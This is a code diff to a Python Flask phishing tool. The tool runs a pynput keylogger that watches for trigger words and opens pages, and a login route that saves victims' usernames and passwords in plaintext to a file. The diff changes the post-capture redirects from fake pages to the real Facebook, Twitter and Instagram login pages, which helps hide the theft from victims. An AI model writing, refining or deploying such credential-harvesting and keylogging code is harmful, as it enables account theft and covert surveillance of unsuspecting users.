@@ -3,11 +3,9 @@ from pynput.keyboard import Key, Listener
 import webbrowser
 import threading
 
-
 app = Flask(__name__)
 
 app.config['DEBUG'] = True
-
 
 current_keys = []
 trigger_words = {
@@ -18,7 +16,6 @@ trigger_words = {
 page_opened_recently = False  # Flag to control page opening
 
 def on_press(key):
-
     global page_opened_recently
     try:
         if key.char:
@@ -74,13 +71,13 @@ def login():
         with open('login_data.txt', 'a') as file:
             file.write(f'Username: {username}, Password: {password}, Origin: {origin}\n')
 
-        # Redirection basée sur l'origine
+        # Redirection vers la vraie page de connexion
         if origin == 'facebook':
-            return redirect(url_for('fake_facebook'))
+            return redirect('https://www.facebook.com/login')
         elif origin == 'twitter':
-            return redirect(url_for('fake_twitter'))
+            return redirect('https://twitter.com/login')
         elif origin == 'instagram':
-            return redirect(url_for('fake_instagram'))
+            return redirect('https://www.instagram.com/accounts/login/')
         else:
             return redirect(url_for('home'))  # Fallback si l'origine n'est pas connue
     else:
@@ -89,9 +86,4 @@ def login():
 threading.Thread(target=start_listener).start()
 
 if __name__ == "__main__":
-
     app.run()
-
-
-
-
